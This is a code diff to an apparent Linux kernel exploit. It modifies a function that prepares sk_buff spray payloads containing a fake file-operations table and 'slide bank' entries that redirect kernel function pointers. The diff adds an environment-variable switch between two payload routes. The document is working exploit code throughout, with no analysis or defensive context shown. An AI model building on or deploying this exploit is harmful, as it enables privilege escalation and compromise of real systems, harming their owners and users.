@@ -557,6 +557,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
   uintptr_t payload_base = base + SKB_DATA_DELTA;
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  int app_original_route = getenv("APP_USE_ORIGINAL_PSELECT") != NULL;
+#endif
+
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
@@ -640,9 +644,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_fops = payload_base + FOPS_TABLE_OFF;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    slide_bank_payload_base = payload_base;
-    slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = misc_fops_data_addr();
+    if (app_original_route) {
+      // The original pselect route uses the fixed W0 payload, not the P0 bank.
+      slide_bank_payload_base = 0;
+    } else {
+      slide_bank_payload_base = payload_base;
+      slide_bank_parents[0] = fake_fops;
+      slide_bank_targets[0] = misc_fops_data_addr();
+    }
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
@@ -740,9 +749,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put_fake_fops_table(p, FOPS_TABLE_OFF);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-      put_slide_bank_entry(p, payload_base, 0,
-                           slide_bank_parents[0],
-                           slide_bank_targets[0]);
+      if (!app_original_route) {
+        put_slide_bank_entry(p, payload_base, 0,
+                             slide_bank_parents[0],
+                             slide_bank_targets[0]);
+      }
 #endif
     }
   }
